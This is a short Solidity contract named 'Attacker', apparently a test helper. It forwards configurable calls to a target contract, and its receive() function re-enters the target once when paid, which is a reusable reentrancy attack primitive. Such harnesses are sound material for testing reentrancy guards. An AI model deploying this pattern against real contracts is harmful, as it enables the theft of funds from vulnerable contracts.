//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

contract Attacker {
    address public calledContract;
    bytes public calledData;
    bool public enter;
    uint public count = 0;

    receive() external payable {
        if (!enter) {
            count++;
            enter = true;
            (bool success,) = calledContract.call(calledData);
            require(success);
        }
    }

    function setData(address _calledContract, bytes calldata _calledData) public {
        calledContract = _calledContract;
        calledData = _calledData;
        enter = false;
    }

    function callWithMsgValue() public payable {
        (bool success,) = calledContract.call{value: msg.value}(calledData);
        require(success, "Attacker::callWithMsgValue:error when call");
    }

    function callWithoutMsgValue() public {
        (bool success,) = calledContract.call(calledData);
        require(success, "Attacker::callWithoutMsgValue:error when call");
    }
}

